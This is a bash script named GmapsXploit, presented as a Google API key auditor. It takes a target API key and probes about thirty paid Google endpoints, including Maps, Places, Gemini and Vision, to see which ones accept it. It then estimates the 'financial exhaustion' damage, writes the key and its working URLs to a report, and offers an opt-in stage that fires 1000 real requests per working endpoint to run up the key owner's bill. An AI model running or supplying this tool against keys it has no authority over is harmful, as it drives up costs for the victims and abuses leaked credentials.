#!/bin/bash
# GmapsXploit - PWNGOD Edition
# Alias: D34thSh0tX_X
# GitHub: github.com/DeathShotXD
# Repo: GmapsXploit

echo -e "${BLUE}"
cat << "EOF"
	 ██████╗ ███╗   ███╗ █████╗ ██████╗ ███████╗██╗  ██╗██████╗ ██╗      ██████╗ ██╗████████╗
	██╔════╝ ████╗ ████║██╔══██╗██╔══██╗██╔════╝╚██╗██╔╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝
	██║  ███╗██╔████╔██║███████║██████╔╝█████╗   ╚███╔╝ ██████╔╝██║     ██║   ██║██║   ██║
	██║   ██║██║╚██╔╝██║██╔══██║██╔═══╝ ██╔══╝   ██╔██╗ ██╔═══╝ ██║     ██║   ██║██║   ██║
	╚██████╔╝██║ ╚═╝ ██║██║  ██║██║     ███████╗██╔╝ ██╗██║     ███████╗╚██████╔╝██║   ██║
	 ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝
EOF
echo -e "${NC}"

echo -e "${BLUE}       		[ RECON ] → [ ENUMERATION ] → [ ABUSE ] → [ BILLING IMPACT ]${NC}"
echo -e "${BLUE}                	>> D34thSh0tX_X  |  github.com/DeathShotXD <<${NC}"
echo -e "${BLUE}		================================================================${NC}"
echo -e "${BLUE}            		THE ULTIMATE GOOGLE API AUDITOR v2026.3 ${NC}"
echo -e "${BLUE}		================================================================${NC}"

# --- CONFIGURATION ---
API_KEY=""
STRESS_COUNT=1000
RED='\e[1;31m'; GREEN='\e[1;32m'; YELLOW='\e[1;33m'; BLUE='\e[1;34m'; NC='\e[0m'

# --- THE PWNGOD MASTER DATABASE (Expanded 2026 Edition) ---
# Format: Name|Type|BaseURL|CostPer1k
ENDPOINTS=(
    "Staticmap|IMG|https://maps.googleapis.com/maps/api/staticmap?center=45,10&zoom=7&size=400x400&key=|2.00"
    "Streetview|IMG|https://maps.googleapis.com/maps/api/streetview?size=400x400&location=40.72,-73.98&fov=90&key=|7.00"
    "Geocode|JSON|https://maps.googleapis.com/maps/api/geocode/json?address=1600+Amphitheatre+Parkway,CA&key=|5.00"
    "Directions|JSON|https://maps.googleapis.com/maps/api/directions/json?origin=Disneyland&destination=Universal&key=|5.00"
    "Distance Matrix|JSON|https://maps.googleapis.com/maps/api/distancematrix/json?units=imperial&origins=DC&destinations=NY&key=|5.00"
    "Elevation|JSON|https://maps.googleapis.com/maps/api/elevation/json?locations=39.73,-104.98&key=|5.00"
    "Timezone|JSON|https://maps.googleapis.com/maps/api/timezone/json?location=39.6,-119.6&timestamp=1331161200&key=|5.00"
    "Find Place From Text|JSON|https://maps.googleapis.com/maps/api/place/findplacefromtext/json?input=Museum&inputtype=textquery&fields=name,rating&key=|17.00"
    "Autocomplete|JSON|https://maps.googleapis.com/maps/api/place/autocomplete/json?input=Paris&key=|2.83"
    "Place Details|JSON|https://maps.googleapis.com/maps/api/place/details/json?place_id=ChIJN1t_tDeuEmsRUsoyG83frY4&fields=name,rating&key=|17.00"
    "Nearby Search-Places|JSON|https://maps.googleapis.com/maps/api/place/nearbysearch/json?location=-33,151&radius=1500&type=restaurant&key=|32.00"
    "Text Search-Places|JSON|https://maps.googleapis.com/maps/api/place/textsearch/json?query=restaurants+in+Sydney&key=|32.00"
    "Places Photo|IMG|https://maps.googleapis.com/maps/api/place/photo?maxwidth=400&photoreference=CnRtAAAATY6p_z_S48W_9Ope963X3ZfM3A&key=|7.00"
    "Nearest Roads|JSON|https://roads.googleapis.com/v1/nearestRoads?points=60.1,24.9|60.1,24.9&key=|10.00"
    "Snap to Roads|JSON|https://roads.googleapis.com/v1/snaptoroads?path=-35.2,149.1|-35.2,149.1&interpolate=true&key=|10.00"
    "Speed Limits|JSON|https://roads.googleapis.com/v1/speedLimits?path=38.7,-9.0&key=|20.00"
    "Air Quality|POST|https://airquality.googleapis.com/v1/currentConditions:lookup?key=|5.00"
    "Compute Routes (New)|POST|https://routes.googleapis.com/directions/v2:computeRoutes?key=|5.00"
    "Aerial View|POST|https://aerialview.googleapis.com/v1/videos:lookup?key=|16.00"
    "Address Validation|POST|https://addressvalidation.googleapis.com/v1:validateAddress?key=|14.00"
    "Geolocation|POST|https://www.googleapis.com/geolocation/v1/geolocate?key=|5.00"
    "Firebase Dynamic Links|POST|https://firebasedynamiclinks.googleapis.com/v1/shortLinks?key=|0.00"
    "Gemini (Generative Language)|POST|https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash:generateContent?key=|12.00"
    "Gemini List Models|JSON|https://generativelanguage.googleapis.com/v1beta/models?key=|12.00"
    "Gemini Files List|JSON|https://generativelanguage.googleapis.com/v1beta/files?key=|12.00"
    "Gemini Cached Contents|JSON|https://generativelanguage.googleapis.com/v1beta/cachedContents?key=|12.00"
    "Cloud Vision|POST|https://vision.googleapis.com/v1/images:annotate?key=|1.50"
    "Cloud Translation v2|JSON|https://translation.googleapis.com/language/translate/v2?q=hello&target=es&key=|20.00"
    "Custom Search|JSON|https://www.googleapis.com/customsearch/v1?q=pwned&cx=test&key=|5.00"
    "Pollen Forecast|POST|https://pollen.googleapis.com/v1/forecast:lookup?key=|5.00"
    "Places Aggregate|JSON|https://maps.googleapis.com/maps/api/place/aggregate/json?key=|32.00"
)

read -p "Enter Target API Key: " API_KEY

echo -e "\n${YELLOW}[!] STAGE 1: RECONNAISSANCE & DATA LEAKAGE ANALYSIS${NC}"
echo "----------------------------------------------------------------"

VULNERABLE_ENDPOINTS=()
declare -A COSTS

for entry in "${ENDPOINTS[@]}"; do
    IFS="|" read -r NAME TYPE BASE_URL PRICE <<< "$entry"
    URL="${BASE_URL}${API_KEY}"
    echo -n "[*] Testing $NAME... "

    if [[ "$TYPE" == "POST" ]]; then
        DATA='{}'
        if [[ "$NAME" == *"Gemini"* ]]; then DATA='{"contents":[{"parts":[{"text":"Hi"}]}]}'; fi
        if [[ "$NAME" == *"Firebase"* ]]; then DATA='{"longDynamicLink":"http://example.com"}'; fi
        if [[ "$NAME" == *"Vision"* ]]; then DATA='{"requests":[{"features":[{"type":"LABEL_DETECTION"}],"image":{"source":{"imageUri":"http://pwn.com/img.jpg"}}}]}'; fi
        if [[ "$NAME" == *"Air Quality"* ]]; then DATA='{"location":{"latitude":40.7128,"longitude":-74.0060}}'; fi
        if [[ "$NAME" == *"Compute Routes"* ]]; then DATA='{"origin":{"location":{"latLng":{"latitude":37.419734,"longitude":-122.0827784}}},"destination":{"location":{"latLng":{"latitude":37.7749,"longitude":-122.4194}}},"travelMode":"DRIVE"}'; fi
        if [[ "$NAME" == *"Aerial View"* ]]; then DATA='{"location":{"latitude":37.7749,"longitude":-122.4194}}'; fi
        if [[ "$NAME" == *"Address Validation"* ]]; then DATA='{"address":{"regionCode":"US","postalCode":"94043","addressLines":["1600 Amphitheatre Parkway"]}}'; fi
        if [[ "$NAME" == *"Pollen"* ]]; then DATA='{"location":{"latitude":40.7128,"longitude":-74.0060}}'; fi

        RESPONSE=$(curl -s -X POST "$URL" -H "Content-Type: application/json" -d "$DATA" 2>/dev/null | tr -d '\000')
    else
        RESPONSE=$(curl -s "$URL" 2>/dev/null | tr -d '\000')
    fi

    if [[ "$RESPONSE" == *"\"status\" : \"OK\""* || "$RESPONSE" == *"shortLink"* || "$RESPONSE" == *"candidates"* || "$RESPONSE" == *"translations"* || "$RESPONSE" == *"snappedPoints"* || "$RESPONSE" == *"models"* || "$RESPONSE" == *"files"* || "$RESPONSE" == *"cachedContents"* || "$RESPONSE" == *"currentConditions"* || "$RESPONSE" == *"routes"* ]]; then
        echo -e "${RED}VULNERABLE (Data Leaked)${NC}"
        VULNERABLE_ENDPOINTS+=("$NAME|$URL")
        COSTS["$NAME"]=$PRICE
    elif [[ "$RESPONSE" == *"referer"* ]]; then
        echo -e "${YELLOW}RESTRICTED (Referer Needed)${NC}"
    elif [[ "$RESPONSE" == *"ipAddress"* ]]; then
        echo -e "${YELLOW}RESTRICTED (IP Needed)${NC}"
    elif [[ "$RESPONSE" == *"REQUEST_DENIED"* || "$RESPONSE" == *"API_NOT_ENABLED"* ]]; then
        echo -e "${NC}SECURE / DISABLED / NOT ENABLED${NC}"
    else
        echo -e "${NC}SECURE / DISABLED${NC}"
    fi
done

# --- STAGE 2: BOUNTY BUILDER (FINANCIAL RISK REPORT) ---
if [ ${#VULNERABLE_ENDPOINTS[@]} -gt 0 ]; then
    echo -e "\n${YELLOW}[!] STAGE 2: BOUNTY BUILDER - POTENTIAL FINANCIAL IMPACT${NC}"
    echo "----------------------------------------------------------------"
    printf "%-25s | %-12s | %-18s\n" "Endpoint" "Unit Price" "Damage (100k Req)"
    echo "----------------------------------------------------------------"
    TOTAL_RISK=0
    for name in "${!COSTS[@]}"; do
        P=${COSTS[$name]}
        ATTACK=$(echo "$P * 100" | bc)
        TOTAL_RISK=$(echo "$TOTAL_RISK + $ATTACK" | bc)
        printf "%-25s | \$%-11s | \$%-17s\n" "$name" "$P" "$ATTACK"
    done
    echo "----------------------------------------------------------------"
    echo -e "${RED}ESTIMATED TOTAL FINANCIAL EXHAUSTION POTENTIAL: \$${TOTAL_RISK}${NC}"

    # Full report + vulnerable count
    REPORT="gmapsxploit_report_$(date +%s).txt"
    echo "GmapsXploit Report - $(date)" > "$REPORT"
    echo "Target Key: $API_KEY" >> "$REPORT"
    echo "Vulnerable Endpoints Found: ${#VULNERABLE_ENDPOINTS[@]}" >> "$REPORT"
    echo "Vulnerable Endpoints:" >> "$REPORT"
    for v in "${VULNERABLE_ENDPOINTS[@]}"; do
        IFS="|" read -r VNAME VURL <<< "$v"
        echo "- $VNAME → $VURL" >> "$REPORT"
    done
    echo -e "${GREEN}[+] Full report saved to $REPORT${NC}"

    # --- STAGE 3: OPTIONAL ATTACK SIMULATION (OPT-IN ONLY) ---
    echo -e "\n${BLUE}[!] STAGE 3: ATTACK SIMULATION (OPTIONAL)${NC}"
    echo "This mode simulates a billing exhaustion attack to prove severity."
    read -p "Launch Proof-of-Concept Attack Simulation? (y/N): " ATTACK_CHOICE
    if [[ "$ATTACK_CHOICE" =~ ^[Yy]$ ]]; then
        echo -e "${RED}[!] WARNING: Simulating 1000 requests per vulnerable endpoint...${NC}"
        for entry in "${VULNERABLE_ENDPOINTS[@]}"; do
            IFS="|" read -r VNAME VURL <<< "$entry"
            echo -n "[+] Attacking $VNAME... "
            for ((i=1; i<=STRESS_COUNT; i++)); do
                curl -s -o /dev/null "$VURL" &
                if (( i % 100 == 0 )); then echo -n "."; wait; fi
            done
            echo " [DONE]"
        done
        echo -e "${GREEN}[+] Simulation Complete. Risk Verified.${NC}"
    else
        echo -e "${GREEN}[+] Skipping attack simulation. Recon results saved.${NC}"
    fi
fi

echo -e "\n${BLUE}================================================================${NC}"
echo -e "${BLUE}GmapsXploit complete! Star github.com/DeathShotXD/GmapsXploit${NC}"
echo -e "${BLUE}================================================================${NC}"
